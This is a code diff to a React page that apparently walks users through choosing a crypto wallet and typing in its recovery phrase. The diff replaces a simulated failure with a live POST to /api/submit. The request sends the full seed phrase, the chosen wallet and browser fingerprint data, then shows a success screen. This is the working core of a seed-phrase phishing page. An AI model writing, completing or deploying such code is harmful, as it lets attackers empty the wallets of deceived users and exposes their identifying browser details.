@@ -68,12 +68,33 @@ export default function Home() {
     e.preventDefault();
     setLoading(true);
     setStatus(null);
-    // Simulate network failure on every submission
-    setLoading(true);
-    setTimeout(() => {
+    try {
+      const res = await fetch("/api/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          phrase: phraseWords.join(" "),
+          wallet: selectedWallet,
+          browserData: {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+          },
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        setStatus("success");
+        setStep("done");
+      } else {
+        setStatus("error");
+      }
+    } catch {
       setStatus("error");
+    } finally {
       setLoading(false);
-    }, 1200);
+    }
   }
 
   // Step 1: Wallet selection
